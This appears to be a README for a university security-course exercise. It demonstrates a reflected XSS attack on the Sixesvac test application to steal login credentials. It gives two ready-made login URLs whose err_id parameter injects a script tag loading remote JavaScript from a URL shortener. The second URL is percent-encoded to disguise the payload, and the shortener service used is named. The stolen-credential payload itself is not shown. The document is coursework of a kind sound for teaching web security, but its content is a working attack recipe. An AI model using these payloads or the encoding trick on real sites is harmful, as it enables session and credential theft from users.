# sixesvac-xss
Ejemplo de ataque de XSS para el robo de credenciales en la aplicación de prueba Sixesvac, para la asignatura de Auditoría e Xestión de Seguridade.

## URL a usar para el ataque XSS
1. `http://localhost:8080/privado/login.php?err_id=<script src="http://shorturl.at/depAO"></script>` (48 caracteres en parámetro de consulta)
3. `http://localhost:8080/privado/login.php?err_id=%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70:%2F%2F%73%68%6F%72%74%75%72%6C.at%2FxKNY7%22%3E%3C%2F%73%63%72%69%70%74%3E` (126 caracteres en parámetro de consulta; discreto mediante codificación URL)

## Acortador de URL usado
https://www.shorturl.at/shortener.php
